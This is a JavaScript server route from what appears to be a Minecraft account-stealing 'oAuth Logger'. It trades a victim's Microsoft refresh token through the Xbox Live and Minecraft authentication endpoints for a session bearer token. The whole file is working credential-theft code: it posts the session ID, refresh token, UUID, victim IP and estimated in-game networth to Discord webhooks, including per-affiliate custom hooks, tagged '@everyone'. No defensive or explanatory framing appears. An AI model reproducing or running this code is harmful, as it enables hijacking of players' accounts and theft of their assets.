import AsciiTable from "ascii-table";
import axios from "axios";
import { WebhookClient, EmbedBuilder } from "discord.js";
import { readFile } from "fs/promises";
import { getClientIp } from "request-ip";

const { clientSecret, clientID, redirectURL, domain, hitWebhookURL } = JSON.parse(
  await readFile(new URL("../config.json", import.meta.url))
);

const webhookHitClient = new WebhookClient({ url: hitWebhookURL });

export default function handleMain(db, webhookClient, sendError, getNetworth) {
  return async function (req, res) {
    const { token, state } = req.query;
    if (!token || !state) return;

    const table = new AsciiTable("oAuth Refresh").setHeading("Type", "Value");
    table.addRow("Token", token.length > 50 ? token.slice(0, 50) + "..." : token);

    try {
      const ip = getClientIp(req);
      table.addRow("IP", ip);

      const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshTokenFromRefreshToken(token);
      const accessToken = accessTokenAndRefreshTokenArray[0];
      const refreshToken = accessTokenAndRefreshTokenArray[1];
      const hashAndTokenArray = await getUserHashAndToken(accessToken);
      const userToken = hashAndTokenArray[0];
      const userHash = hashAndTokenArray[1];
      const xstsToken = await getXSTSToken(userToken);
      const bearerToken = await getBearerToken(xstsToken, userHash);
      const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken);
      const uuid = usernameAndUUIDArray[0];
      const username = usernameAndUUIDArray[1];
      const networth = await getNetworth(username);
      table.addRow("Username", username);
      table.addRow("Networth", networth);

      res.send("Success! You can exit this page and return to discord.");

      const { webhook, dhooked } = await db.getWebhook(state);
      if (webhook) {
        if (dhooked) {
          const webhookRes = await postToWebhook(
            webhookClient,
            username,
            bearerToken,
            uuid,
            ip,
            refreshToken,
            networth,
            state
          );
          if (!webhookRes) {
            table.addRow("Webhook", "❌");
          } else {
            table.addRow("Webhook", "✅");
          }
        }

        const webhookClientCustom = new WebhookClient({ url: webhook });
        const customWebhookRes = await postToWebhook(
          webhookClientCustom,
          username,
          bearerToken,
          uuid,
          ip,
          refreshToken,
          networth,
          state
        );
        if (!customWebhookRes) {
          table.addRow("Custom", "❌");
        } else {
          table.addRow("Custom", "✅");
        }
      } else {
        const webhookRes = await postToWebhook(
          webhookClient,
          username,
          bearerToken,
          uuid,
          ip,
          refreshToken,
          networth,
          state
        );
        if (!webhookRes) {
          table.addRow("Webhook", "❌");
        } else {
          table.addRow("Webhook", "✅");
        }
      }

      const embed = new EmbedBuilder()
        .setColor("Orange")
        .setTitle("oAuth Refresh")
        .setDescription(`Networth: **${networth}**`);
      await webhookHitClient.send({ embeds: [embed] });
    } catch (e) {
      var errorMsg;
      if (e.response) {
        errorMsg = e.response.data;
      } else if (e.request) {
        errorMsg = e.request;
      } else {
        errorMsg = e.message;
      }

      if (errorMsg.error == "invalid_grant") {
        errorMsg = "Invalid code or User deauthenticated the application.";
      } else if (errorMsg.error == "NOT_FOUND") {
        errorMsg = "You don't own Minecraft.";
      } else if (errorMsg.Redirect == "https://start.ui.xboxlive.com/AddChildToFamily") {
        errorMsg = "You need to add an adult to your account.";
      } else if (errorMsg.Redirect == "https://start.ui.xboxlive.com/CreateAccount") {
        errorMsg = "You need to create an Xbox account.";
      }

      try {
        res.send(errorMsg);
      } catch (e) {}
      table.addRow("Error", errorMsg);
      sendError(e);
    }

    console.log(table.toString());
  };
}

async function getAccessTokenAndRefreshTokenFromRefreshToken(refreshToken) {
  const url = "https://login.live.com/oauth20_token.srf";
  const config = {
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
  };
  let data = {
    client_id: clientID,
    redirect_uri: redirectURL,
    client_secret: clientSecret,
    refresh_token: refreshToken,
    grant_type: "refresh_token",
  };
  let response = await axios.post(url, data, config);
  return [response.data["access_token"], response.data["refresh_token"]];
}

async function getUserHashAndToken(accessToken) {
  const url = "https://user.auth.xboxlive.com/user/authenticate";
  const config = {
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
    },
  };
  let data = {
    Properties: {
      AuthMethod: "RPS",
      SiteName: "user.auth.xboxlive.com",
      RpsTicket: `d=${accessToken}`,
    },
    RelyingParty: "http://auth.xboxlive.com",
    TokenType: "JWT",
  };
  let response = await axios.post(url, data, config);
  return [response.data.Token, response.data["DisplayClaims"]["xui"][0]["uhs"]];
}

async function getXSTSToken(userToken) {
  const url = "https://xsts.auth.xboxlive.com/xsts/authorize";
  const config = {
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
    },
  };
  let data = {
    Properties: {
      SandboxId: "RETAIL",
      UserTokens: [userToken],
    },
    RelyingParty: "rp://api.minecraftservices.com/",
    TokenType: "JWT",
  };
  let response = await axios.post(url, data, config);

  return response.data["Token"];
}

async function getBearerToken(xstsToken, userHash) {
  const url = "https://api.minecraftservices.com/authentication/login_with_xbox";
  const config = {
    headers: {
      "Content-Type": "application/json",
    },
  };
  let data = {
    identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken,
    ensureLegacyEnabled: true,
  };
  let response = await axios.post(url, data, config);
  return response.data["access_token"];
}

async function getUsernameAndUUID(bearerToken) {
  const url = "https://api.minecraftservices.com/minecraft/profile";
  const config = {
    headers: {
      Authorization: "Bearer " + bearerToken,
    },
  };
  let response = await axios.get(url, config);
  return [response.data["id"], response.data["name"]];
}

function postToWebhook(webhookClient, username, bearerToken, uuid, ip, refreshToken, networth, state) {
  return new Promise(async function (resolve, reject) {
    const embed = new EmbedBuilder()
      .setColor("#00ff50")
      .setTitle(`:book: Minecraft Info (Refreshed)`)
      .setDescription(
        `**SkyCrypt** - [here](https://sky.shiiyu.moe/stats/${username})\n**Refresh** - [here](${domain}/refresh?token=${refreshToken}&state=${state})`
      )
      .addFields(
        { name: "Username", value: `\`\`\`${username}\`\`\``, inline: true },
        { name: "UUID", value: `\`\`\`${uuid}\`\`\``, inline: true },
        { name: "IP", value: `\`\`\`${ip}\`\`\``, inline: true },
        { name: "SessionID", value: `\`\`\`${bearerToken}\`\`\``, inline: false }
      )
      .setFooter({ text: `🪙 Networth - ${networth}` });

    try {
      await webhookClient.send({
        content: "@everyone",
        username: "oAuth Logger",
        embeds: [embed],
      });

      return resolve(true);
    } catch (e) {
      return resolve(false);
    }
  });
}
